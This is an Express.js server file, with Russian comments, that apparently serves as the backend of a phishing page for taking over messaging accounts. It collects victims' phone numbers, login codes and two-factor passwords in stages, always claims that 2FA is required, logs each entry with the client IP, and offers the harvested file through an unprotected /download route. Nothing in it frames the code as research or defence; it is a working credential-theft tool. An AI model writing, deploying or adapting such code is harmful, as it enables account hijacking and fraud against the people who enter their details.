const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

const DATA_FILE = process.env.RENDER ? path.join('/tmp', 'data.txt') : 'data.txt';

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

app.post('/api/phone', (req, res) => {
    const { phone } = req.body;
    if (!phone || phone.length < 7) {
        return res.status(400).json({ error: 'Invalid phone' });
    }
    const data = { phone, ip: req.ip, time: new Date().toISOString() };
    fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
    console.log('📱 Phone:', phone);
    res.json({ success: true });
});

app.post('/api/verify', (req, res) => {
    const { phone, code } = req.body;
    if (!phone || !code || code.length < 5) {
        return res.status(400).json({ error: 'Invalid data' });
    }

    // Сохраняем код
    const data = { phone, code, ip: req.ip, time: new Date().toISOString() };
    fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
    console.log('🔑 Phone + Code:', phone, code);

    // Всегда просим 2FA (если хочешь — можно проверять наличие 2FA через API)
    res.json({ requires2FA: true });
});

app.post('/api/2fa', (req, res) => {
    const { phone, code, password } = req.body;
    if (!phone || !password) {
        return res.status(400).json({ error: 'Invalid data' });
    }

    const data = { 
        phone, 
        code, 
        twofa_password: password, 
        ip: req.ip, 
        time: new Date().toISOString() 
    };
    fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
    console.log('🔐 Phone + Code + 2FA:', phone, code, password);
    res.json({ success: true });
});

app.get('/download', (req, res) => {
    if (fs.existsSync(DATA_FILE)) {
        res.download(DATA_FILE, 'data.txt');
    } else {
        res.status(404).send('❌ Файл пока пуст.');
    }
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});